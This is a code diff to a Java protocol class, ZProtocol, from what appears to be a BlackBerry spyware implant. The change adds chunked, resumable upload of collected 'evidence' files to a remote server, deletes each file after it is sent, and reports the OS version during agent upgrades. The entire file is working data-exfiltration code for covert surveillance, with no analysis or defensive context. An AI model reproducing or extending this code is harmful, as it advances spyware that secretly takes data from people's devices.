@@ -22,6 +22,7 @@ import blackberry.Status;
 import blackberry.Task;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
+import blackberry.config.Cfg;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -39,7 +40,7 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.INFORMATION); //$NON-NLS-1$
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
@@ -184,7 +185,7 @@ public class ZProtocol extends Protocol {
 
                 boolean left = true;
                 while (left) {
-                    response = command(Proto.UPGRADE);
+                    response = command(Proto.UPGRADE, WChar.pascalize(Cfg.OSVERSION));
                     left = parseUpgrade(response);
                 }
                 response = null;
@@ -511,7 +512,6 @@ public class ZProtocol extends Protocol {
 
                 purgeEvidences(Path.hidden(), date, size);
             }
-
 
         }
     }
@@ -854,29 +854,10 @@ public class ZProtocol extends Protocol {
                     //#endif
                     continue;
                 }
-                final byte[] content = file.read();
-                //#ifdef DEBUG
-                debug.info("Sending file: " //$NON-NLS-1$
-                        + EvidenceCollector.decryptName(logName) + " size: " + file.getSize() + " date: " + file.getFileTime());
-                //#endif
-
-                plainOut = new byte[content.length + 4];
-                Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
-                        0, 4);
-                Utils.copy(plainOut, 4, content, 0, content.length);
-
-                response = command(Proto.LOG, plainOut);
-                plainOut = null;
-
-                boolean ret = parseLog(response);
-
-                if (ret) {
-                    logCollector.remove(fullLogName);
+                if (Cfg.PROTOCOL_RESUME && file.getSize() > Cfg.PROTOCOL_CHUNK) {
+                    sendResumeEvidence(file);
                 } else {
-                    //#ifdef DEBUG
-                    debug.warn("error sending file, bailing out"); //$NON-NLS-1$
-                    //#endif
-                    return;
+                    sendEvidence(file);
                 }
             }
             if (!Path.removeDirectory(basePath + dir)) {
@@ -895,6 +876,131 @@ public class ZProtocol extends Protocol {
         //#endif
     }
 
+    private void writeBuf(byte[] buffer, int pos, byte[] content) {
+        System.arraycopy(content, 0, buffer, pos, content.length);
+    }
+
+    private void writeBuf(byte[] buffer, int pos, int whatever) {
+        System.arraycopy(Utils.intToByteArray(whatever), 0, buffer, pos, 4);
+    }
+
+    private void writeBuf(byte[] buffer, int pos, byte[] whatever, int offset, int len) {
+        System.arraycopy(whatever, offset, buffer, pos, len);
+    }
+    
+    private boolean sendResumeEvidence(AutoFile file) throws TransportException, ProtocolException {
+        int chunk = Cfg.PROTOCOL_CHUNK;
+        int size = (int) file.getSize();
+
+        final byte[] requestBase = new byte[5 * 4];
+
+        byte[] evid = Encryption.SHA1(file.getFullFilename().getBytes());
+        writeBuf(requestBase, 0, evid, 0, 4);
+        writeBuf(requestBase, 12, size);
+
+        byte[] response = command(Proto.EVIDENCE_CHUNK, requestBase);
+
+        int base = parseLogOffset(response);
+        boolean full = false;
+
+        //#ifdef DEBUG
+        debug.trace("sendResumeEvidence: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
+        //#endif
+       
+        // TODO: uscita quando finisce
+        while (base < size) {
+            //#ifdef DEBUG
+            debug.trace("sendResumeEvidence, base: " + base + " size: " + size);
+            //#endif
+           
+            byte[] content = file.read(base, chunk);
+            if(content==null){
+                //#ifdef DEBUG
+                debug.error("sendResumeEvidence: null read");
+                //#endif
+                break;
+            }
+            if (content.length < chunk) {
+                //#ifdef DEBUG
+                debug.trace("sendResumeEvidence smaller read: " + content.length);
+                //#endif
+
+            }
+            byte[] plainOut = new byte[content.length + 16];
+
+            writeBuf(plainOut, 0, evid, 0, 4);
+            writeBuf(plainOut, 4, base);
+            writeBuf(plainOut, 8, content.length);
+            writeBuf(plainOut, 12, size);
+            writeBuf(plainOut, 16, content);
+
+            response = command(Proto.EVIDENCE_CHUNK, plainOut);
+            base = parseLogOffset(response);
+
+            if (base == size) {
+               //#ifdef DEBUG
+            debug.trace("sendResumeEvidence: full");
+            //#endif
+                full = true;
+            }
+            if (base <= 0) {
+                //#ifdef DEBUG
+                debug.error("sendResumeEvidence");
+                //#endif
+                break;
+            }
+        }
+
+        if (full) {
+            EvidenceCollector.getInstance().remove(file.getFullFilename());
+            return true;
+        } else {
+            //#ifdef DEBUG
+            debug.error("sendResumeEvidence: no full");
+            //#endif
+
+            return false;
+        }
+    }
+
+    private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
+        final byte[] content = file.read();
+        //#ifdef DEBUG
+        debug.info("Sending file: " //$NON-NLS-1$
+                + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime());
+        //#endif
+
+        final byte[] plainOut = new byte[content.length + 4];
+        Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
+                0, 4);
+        Utils.copy(plainOut, 4, content, 0, content.length);
+
+        final byte[] response = command(Proto.LOG, plainOut);
+
+        boolean ret = parseLog(response);
+
+        if (ret) {
+            EvidenceCollector.getInstance().remove(file.getFullFilename());
+        } else {
+            //#ifdef DEBUG
+            debug.warn("error sending file, bailing out"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+        return true;
+    }
+
+    protected int parseLogOffset(final byte[] result) throws ProtocolException {
+        if (checkOk(result)) {
+            if (Utils.byteArrayToInt(result, 4) == 4) {
+                return Utils.byteArrayToInt(result, 8);
+            }
+            return 0;
+        }
+
+        return -1;
+    }
+    
     protected boolean parseLog(byte[] result) throws ProtocolException {
         return checkOk(result);
     }
